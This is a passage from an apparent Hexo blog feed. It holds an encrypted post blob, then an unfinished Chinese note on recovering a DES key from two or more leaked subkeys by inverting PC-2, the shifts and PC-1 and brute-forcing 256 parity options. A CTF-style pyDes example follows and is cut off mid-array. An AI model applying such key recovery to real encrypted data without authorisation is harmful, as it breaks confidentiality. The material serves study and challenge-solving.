  <script id="hbeData" type="hbeData" data-hmacdigest="90a0d50d1ac2ea92b1b74007aad24567cd97332bd187f4fab2973781664f2433">e02542295cc1752aff188fc3f300e311ebaaae0b6c9fda8d942834ac071399887a4b3929f51941045050efaf62be5e9d47a9d9710e54a66145cfcb5d06c0391dfd9f772c7dd6828f87e5f267c8daacc7107821460df0a2129cd347bd6fa0d7e51a4b6ac1dcb82b53c2cba8bb2ced9a58fc3bca06413539d4aee70dd1175370bdf0ca4821ae9133e4bf6923adb9d6def4773793d319e14edb760e5f421fa890223654e11102230fefecca6541864ebc77b283632769f1d7a28abb32a72916558d1ac6f6965735edb3f842bda918e7f37ce939d1af04033ff745bcab438d3e7b15ef36d86d1e99ce6b7e61574636c53d337125c76aabf1bf8fa2109a0c7b6bc3f8d59fbe21bb45478fc070ae8b3602f668626644aa5c3fd2470c40a744c03938124815eea789548ab41ef7f2d6b1e998842a8858fa5cd302e18a769f339441e80d4a20985be51b24a627b5b363d48efa29c19f1f6b97cca332a076ec68faca452eb70f9209bd862ecd916c382f193e830a269b0ff556598f17696059eb9d1024f3d3ff0769420f4ca7913e7300a6c0bdc1eb624085f524397a3078289ea50a005695c69bda94be699d05d4a3f470f545b917e2bfdc378210f616d2ca2a6687f6eab745f32d3aafa233fdeef86d3d3b2ed4735eabfc141834d63010edd2f57065df71a902a1aec9b63020e70a837c1c8293f35909d87092c1cf6d792cafa8b46cc701030185411819fff6a8897290fee1b325ef1e70aba6bd94b458591ab5baca1214566180be0c8ef4fba2c8ae9553089c11853148783ceb9a2525fe9840fb48c4817cedbdb8fb95ec7113df1b9ff3cb9d80d4a92bbd39a9d18784bebfc2b6a02919862a3d551f3cd1235cbbeca1297b059899909df8b6ffaa8b1de37309b4ea44325b98a19920f6fcdd3695e1c1ba8620f7c2f2078bb32e300264a46a4c78d8e5db1af8c08123b250bfd941bfe12130b7eccd49856c599325a9f2cb51461998ee76a3320610e923a00d8b95520883c95a758dd749df9b689ae08bf5e2ce727401a404e1427457f5d7c0e2a8dfc74bcc0dda083f4e7d34701280f1e8afc70ca3b379ff27da99f5519f55854aa7ecb37ca96a5509c12b606e442b124902d64b35984949ad6e84db62c37fb9f1b5ecd75483fac02e8630deed4b418a8026ec1db9ec815a6ac160859cf558944dd5a5b709e8f5736436ebe9e46eceef39ba6017cf42c5912a5ecc1597dc09b61a3d6b80a8a2be5738bf391ad528f3cd853b4bafeab33b854be7ca30a37f7ffa0dfd71eb649f590144b32b05fd13c9281f919ea1d37727fe7f28147be98412df48a913b56444e92a7fbc5ee0fa637ad4756e8997228ad8b040f656a04f06a6d147c77faf0c0a7c663984e91dd3ad8f79622f26d3a44acbfa2de5aaa251484c77990fa6939a6adef971e6ef7f7a4308860e0ab01d25f0c2cb3218829fd9d02ae5c8f0057b42192cee6ca8ade1adc51aaeaa494533eb64f9bf282ae4cc9b2901ae9095da2d1b847fe5280442630cd58c9885a01fc0b30d721db3a77e349a10a24d300dd942e26331dbe3055156cf941a24780d75bc46da093d48dca848971de8a5c95a389ab2519c0dad2e6bab3a0248a9919bdfcf884dac7d3572399d256475bb55ce7e17ed00f96477ed56814b8a87ad5b28ea8cc881727ba3d023e22604f286cf6b78a6a3ec37b6cb9296d2bb77ea5d4f4e6cbb80448d97e8dfbce5a4419930eb16735aaa890c77cc96b0fdd47b2ea38ba88efa8c53b072903bc10c9b765ecdc6456cf5e9119573628117f775ac2fc3b0317926799bd04dc6da78acdb51181d16936cbcf9d8e21ded1ccf261a88fcff2ab16fb763d28b85fffcb49202c331e5f58eaddbfa9bceaa23f1b4f4de6bb190cacfb29b9656df3676bdb8e920f7fd76b3e4548d7863234cf94c8193791fd923c4c0c5a007c5abcee04492eb7c95c1ebb21b3affe27dfa704ba6be533f4de1b38103803d379beaacaa31b7e4cfa5312f9825273da2a64fbb7e84b89d55630c37a9704db4c8872bb06066d7e904aa646eb030851f96d94c18e1ad54436e4d1b287db56447d06507912618be99a12d55d5d67a9a134e240ccfe81bcaab4904eb2bd2c089283901ce6abdc9bbe3f9409768401aa994c545e05c8d48a37fd2078e0d356bed6dd922a3f22f6b0b1e62eb861ed25f1744db41cc779aa52b0d15154c08822e3beafec58eab8b7ee2edae149a16c49f4225d7ca49e2e642a1fb3336443b2ebc2d715853a58e6326548619e74dec9c230bbb891ff41493355a1508375e5282c94d6024ad6cdc0562273642f84af0d4e5b30e97645212b2e4be0df614591c1b005cd56729dead8cf51a6a807cc7ec95825acbea04b151a1a9b0e16468fca1e04b3a002298b67ebc9933189716e1499ff6dcea980fe048be934d9b507e2102c6885beb4f510959c6b7b12afcb6b521bf055cdce50bd57e0a40ca019443c663aedf926d6b355b3b2ee004a1146e84a0e4979a2f75efc5e48c6d620e0171bf149241105dcfd4306980d0566edfe2949ffdeefc5e6b3ca1d3ca93c45a7d78f0052765f1f59955bad723781fc6f0ca285b94cb9a3cc727b4a2b66204aff7073195a6121472ea99fd5612294d1027859b66fbc87b49db922f497507a0b9da763f0563b6cdae9d74e42bba637efc2d537a83a0dc42ae2e6cc5729cfc42e6f7b1656b39fc030caf2458cc46fe738ac2f9840fc9936eacabd2639c8e07136bfb0edb6cfe5bc863dc0d6546eeabe9536846f24504ab64491015d54a6ff9275ec12301921916747270d16eb54bc060180af94e89e0663d238a090800caeabfc14ffb81b2b2265d25c6e0851069d9f0c970d6d435aa5b666036dc4a8fa927df34f65201f537fc70dd49b4acf258adcd84ffea797617722f02832f0d1aa7454f837dd9342f3b3284a3d6e5c0d6c1e479a883fbe9548625812adc7258e18faff42fd86f557af1f301947940c3fcf60f20582370dbd4c99d94eef06aa9cce5a511f742e719b324a6f7183a7d0f8935503e263ecdb0ae8be8ad660df94de38b54f83dd860eb710da1f346ae7709980a99f27b1705c94b149172e153107c149a70c1d95512fd28c3d5ef745ae52ac7d4cac3d3a7fd11c8f82e9023e306b49cb9d513c2a2a355ee66e69ab91d48001c1516c0d719ed61605906c5cea5fc1bdfdd0bbda7570569b0b628cc10404c9d1ede13022520739a0ac1add60ff2b0e5973b03cc2ea1d6f71c261ea4bd4599df2d562b4f1dab3202021c2fda7651cd4edf043b5c48917dfe2ef6f7085d0d071991bf03ea25d78c1e0d1800eed609769e6a997553cd595cc5309c06141901ab64a387f19477df58f7af670ea51f4a376e4d0a4123fa1f27a62b1fcf45c5c3cf09e32b229b9ed72b6b19887d87e87d84d631d13cf4389c98a1a0b5cae16bf508d486ad627256692687dffb35e77f0dbc4912826f68835d0e31026261a1f214ead6bedae510f6287ea6e1ba5a8082ebac6953aa07238f0055c5d908e94b1d08b23eac3d278077eed8584e8e93c5d74f0ba3c2ec32d775a04f6d0c2d35f51de31197fcd287b985d436edc2c5bfb93d599a97ac8f58943126480d7cc27057d07865f1c1369f4b584d4db6549ae34a6c5efdffef75915586220be9a5927fcdfb8dcd5396d4f477b5a12e0774ce7ae8505c32186c55047e2bf17d9a5ffd07a0580a1bb333098a5a6ae10b3f697e0f234aa65f46ecfe7d989985f4c2a611979fac2bda821846be663cbb2578103433dd09cec38e701777d053d16e16d6d776ef2d43b06892057fc5ae1c3a76d76343fdb6076aea63133efb6851c485ffd5634d29d04dadcf6d2da60afe901b2c26c97ee01ff84181557327f9eb49fa5ffcd2c5bff312e9e19876118b865a9dffc21c984ae45c8aac346aa2c7e521a4b223c94d035c453c3d17aaef4514be22db8e8a1d5b2e2fe396c809ef9f94ad93b0d33fc5ed06c7fe3259eb704c9c59a539010e267daa7a2f6fda95151920d41aa15b53fbd889a317ea3da7fcee7139d5d47c5088ac9d0be2fb84eaecb40d930182df61495668f802ecdd691e701521795b8eb7d2b0205bf857fb32a243a58d71b4b0b5d2fd3e230f70b1521dd230a80aad1bc3eb930373e7d2ade1cc6df2bf0142842e0b72f6997b1044a1e01ed760a730c9499625801c1d417bd64cab7c65b70fc10608eb2ce141fa0a5bb8773ce78f729e79f5f19a61e9a008ea3f97e4111a3288c338a2f903fede8ecb528930d8f196ae5449bb88f8100daf8fb8a9d49a9f82651389d20702a58e0044989a9c97523d825f45128019d3f261f9136a0669fae4818ecad6c283caa84952b1cdf328d413353cde97e71ba366431db5ab913319af9edef23625833129fffbd715d2c9e61e9127e29d04a7bb7118fb1e69f76ca2da0cbdb0eb99011abf76f421975a6b27218620076d02b85b2c3f4d08ea7ab70cdc3f446a0040ed5486d975af3aea4e870687dc5bf093bcbcb6b3047ab698b780597fc0bb0f079e3b5be22e42fdd8af99b2370f677d9133bf3e284a8282983ce8e4a92c8515c7a2aff21a58117daeb7cc0d79cbe8466ca3cae8c24343caf25b5ca0c8e58493b729819e706ea8d7be1767a21482d78bce6c44add2bfe75be9453106778b99cc4e8f979e1820361a1c546020aa84aa1c88d14754f279befdd8e6d4eb9315663024d92fb236b38d39a97f2d681adc94f07eed00351334762ad6e2eda6e4503752bd42a6311473e4850431cb5bb7b2a0918ed8a54d94cead58bce168af4c019c0a36638305b20afba39b2dadedbb22c09b83ba44ab45b2638aeaa0c370fee86b8fdfef85df7cadb2a3fe661b16deb3a1050cb23da99675eef1a1e980bcb5fac63a2ddccb5090f3b9c052df2f4b8931802ba83aaf7a084a788b6ca2d98056e6c323ca776ab404d4248bfcb97afbe08a2d507d2a288a26ec9c0093f305a347ce42bc27ad68b504d3b0594f4a79cf22219d05193e4e2818ba6f673ce41d0761a28466397565e11b16544cd049e3d134c1619e6e6453e08756c894ff0cf6cadfe07ffd628b1277141f6441e655d482feb4914c768e1a75c4d0830cf892cd3b1a100a20272d0cded5ed2985a23f83dc9860e10279b647c3f0f4cdc5999359fc8f17f925468f8799ee45fc382e24c428d5f0fe30d7799d14f4f9c8201d8b4d34addcee50a3d06000c37f1c1c4505db4801b5826485f9fbffa6098eeaa849779d22879fb35117238437097bb002b227753292eb679f9e057a23aa8968e9d64fd34f10bf85f9b573b0adf89dcd7fe09c12ac909571704a7f7568f91cad8a6d9ebbf03134f2699162d9221cce852733f923428dc2e009b5fef6f52a48d64a32cd3103962f9da176b4e325031383305b90fef64d190efbc4bf73cb760e4c4f57c731f92575405de8c367f7a632f251a35b116b847f9b6f5d9da494a25e63bd686c448f924ccb255b0f69b65e17e6787882147179c30a910e8ff11044c4c8dc91e4ea727d5a55f7a6107553b0b96c8a6eb4d7c815daf0ae9403b0d6c16ab1fbf02994b66a55edf8b4ff753114bcf69f5fdbc63ec46588c88c77df64f5c5a283d2b728cf900b34ebff01c2e15cd4d7731f3803bbd078e04ca069aec586888a265fe754ed7e4f79aefc54e16722e3467d42486f7d2835a05c6b32e205ccc4da65b6f586d9beb66946b87529dd80eb082c2b811fc00d5803987376d49a6985b1252e7bce20b736a491e9b7da08cffb1790f065d37d377e7b333b7ab0ef0eff50f3fb4c06b3351c6cd6b53c630eb9e508ccad6afb118d64c2cc1600def1ae9a97d6e5e77f1aa6cd595cdb6f0a44beb2ab35f9347bfe979baab09bca0ffebd264b39fa1d8242f0b8b60592124eda82fb051c36b2b354543b044b264672e7c58d6a86debd6a2c7ff91aff53bef2bcff5ed8ce0391d11746c018fd8496db46cc01259962409683ef03bbc7e2d3941f9e048721d8541b506d70b04d0d696c4721c4ec9853fb104c64e952951be0b448948020b9721836ec06472b2594de35da9d8878fe45986927059a6794b246e0a778ee81c0f83da3d97d99d428be3b47a104114be7e7ebba6737b04856efea7cd349aa75474bcaec3bc0b6fb749cac62646281cc407889e50f24b4d647c7a022876a3ca42a5670cc5096c81ec8c009535239d5e7d2ba1e691365fb0a518793098d21df12f15b132a77148c2a074e8888565757bdef0aa5dfaaabf2d226a0dd4b88699a5e5f9695190a8de6a45c9d653b3fd16535e17ddbb4a47e249351a51c503580c49966f2300d1fc9ccf55cdf02c0395a546bc6b01fe2daf3f1dd1c5aba64b474d97d5adef2919027dd347d09900c46f50c33f42a08315322a20c4300</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>DES子密钥逆推初始密钥 - 待完成</title>
    <url>/posts/9047dc7c/</url>
    <content><![CDATA[<p><a href="https://www.freebuf.com/news/topnews/219723.html">https://www.freebuf.com/news/topnews/219723.html</a></p>
<p><a href="https://blog.csdn.net/weixin_44110537/article/details/107524863">https://blog.csdn.net/weixin_44110537/article/details/107524863</a></p>
<p><a href="https://limbenjamin.com/articles/des-key-parity-bit-calculator.html">https://limbenjamin.com/articles/des-key-parity-bit-calculator.html</a></p>
<p>如果DES加密在两轮或两轮以上的子密钥泄露，几乎可以推出初始密钥。</p>
<p>但是由于有效位为56bit，所以在恢复后可恢复56bit，还剩8bit未知。</p>
<p>但是有2^8=256种情况，可通过暴力破解解出。【前提条件是有标准误进行判断是否为准确的子密钥】</p>
<h2 id="DES子密钥生成"><a href="#DES子密钥生成" class="headerlink" title="DES子密钥生成"></a>DES子密钥生成</h2><p>正向过程如下图所示</p>
<p>![image-20240204115958526](/Users/mamor/Library/Application Support/typora-user-images/image-20240204115958526.png)</p>
<p>PC-1置换得到 K’ 56位</p>
<p>C0 D0 28位 进行左移操作</p>
<p>经过PC-2置换得到 K1 48位</p>
<h3 id="1-PC-2-逆置换"><a href="#1-PC-2-逆置换" class="headerlink" title="1.PC-2 逆置换"></a>1.PC-2 逆置换</h3><h3 id="2-循环左移逆运算"><a href="#2-循环左移逆运算" class="headerlink" title="2.循环左移逆运算"></a>2.循环左移逆运算</h3><h3 id="3-PC-1-逆置换"><a href="#3-PC-1-逆置换" class="headerlink" title="3.PC-1 逆置换"></a>3.PC-1 逆置换</h3><h3 id="4-爆破奇偶校验位"><a href="#4-爆破奇偶校验位" class="headerlink" title="4.爆破奇偶校验位"></a>4.爆破奇偶校验位</h3><hr>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">deskey = <span class="string">&quot;********&quot;</span></span><br><span class="line">DES = pyDes.des(deskey)</span><br><span class="line">DES.setMode(<span class="string">&#x27;ECB&#x27;</span>)</span><br><span class="line">DES.Kn = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span 